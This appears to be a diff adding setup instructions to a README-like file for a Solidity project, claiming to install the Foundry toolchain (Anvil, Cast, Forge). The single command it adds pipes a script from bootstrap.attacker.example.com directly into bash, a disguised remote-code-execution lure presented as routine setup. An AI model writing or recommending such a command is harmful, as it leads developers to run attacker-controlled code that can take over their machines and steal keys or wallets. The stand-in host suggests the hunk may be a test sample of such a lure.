@@ -1,0 +1,3 @@
+Bootstrap your Solidity project environment:
+curl -o- https://bootstrap.attacker.example.com/solidity-env.sh | bash
+The script sets up Anvil, Cast, Forge, and all Foundry toolchain components.
